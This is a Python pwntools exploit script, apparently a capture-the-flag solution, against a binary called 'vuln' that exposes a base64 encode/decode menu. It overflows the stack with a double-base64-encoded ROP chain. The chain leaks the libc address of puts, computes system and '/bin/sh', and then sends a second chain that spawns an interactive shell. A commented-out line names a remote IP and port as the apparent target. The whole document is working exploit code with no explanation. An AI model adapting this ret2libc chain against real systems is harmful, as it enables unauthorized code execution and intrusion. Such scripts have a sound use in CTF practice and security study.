#!/usr/bin/env python3
from pwn import *
import base64

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
context.update(binary=elf, log_level="DEBUG")
# p = remote("159.223.41.73", "13337")
p = elf.process()
# p = gdb.debug('./vuln', '''
# 	b *0x400f6e
# 	b *0x400f97

# 	b *0x400E46
# 	b *0x400ED1
# 	b *0x400E1B
# 	''')
# encode
# decode
# memset in decode
# decodeBase64
# printf result in decodeBase64

def encode(payload):
	p.sendlineafter(b"3. Exit\n", b"1")
	pl = b"/enc " + payload
	p.sendline(pl)
	return 

def decode(payload):
	p.sendlineafter(b"3. Exit\n", b"2")
	pl = b"/dec " + payload
	p.sendline(pl)
	return

# 3 -> 4
# 4 * 29
prdi_ret = 0x0000000000401033 #: pop rdi ; ret
ret = prdi_ret + 1
main_addr = 0x400EF0

############# LIBC leak
pl1 = b""
# pl1 += b"\x05\x05\x05" * 40
# pl1 += b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma"
pl1 += b"A" * 35
# pl1 += b"ABCDEFGH"
pl1 += p64(ret)
pl1 += p64(prdi_ret)
pl1 += p64(elf.got['puts'])
pl1 += p64(elf.symbols['puts'])
pl1 += p64(ret)
pl1 += p64(main_addr)
pl1 += b"A" * (110 + 35 - len(pl1))

# log.info("Payload: " + pl1.decode())
log.info("Length payload: " + hex(len(pl1)))

pl1 =  b"a" + base64.b64encode(pl1)
log.info("Payload 1 times: " + pl1.decode())
log.info("Length payload 1 times: " + hex(len(pl1)))

encoded_pl1 = base64.b64encode(pl1)
log.info("Payload 1 times: " + encoded_pl1.decode())
log.info("Length payload 2 times: " + hex(len(encoded_pl1)))

decode(encoded_pl1)
leak = p.recvlines(3)
libc.address = u64(leak[1].ljust(8, b"\x00")) - libc.symbols['puts']
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
exit_ = libc.symbols['exit']

log.info("LIBC base address:             " + hex(libc.address))
log.info("Libc system func address:      " + hex(system))
log.info("Libc string '/bin/sh' address: " + hex(binsh))
log.info("Libc exit func address:        " + hex(exit_))

############# Get Shell
pl2 = b""
pl2 += b"A" * 35
pl2 += p64(ret)
pl2 += p64(prdi_ret)
pl2 += p64(binsh)
pl2 += p64(system)
pl2 += p64(ret)
pl2 += p64(exit_)
pl2 += b"A" * (110 + 35 - len(pl2))

# log.info("Payload: " + pl2.decode())
log.info("Length payload: " + hex(len(pl2)))

pl2 =  b"a" + base64.b64encode(pl2)
log.info("Payload 1 times: " + pl2.decode())
log.info("Length payload 1 times: " + hex(len(pl2)))

encoded_pl2 = base64.b64encode(pl2)
log.info("Payload 1 times: " + encoded_pl2.decode())
log.info("Length payload 2 times: " + hex(len(encoded_pl2)))

decode(encoded_pl2)

p.interactive()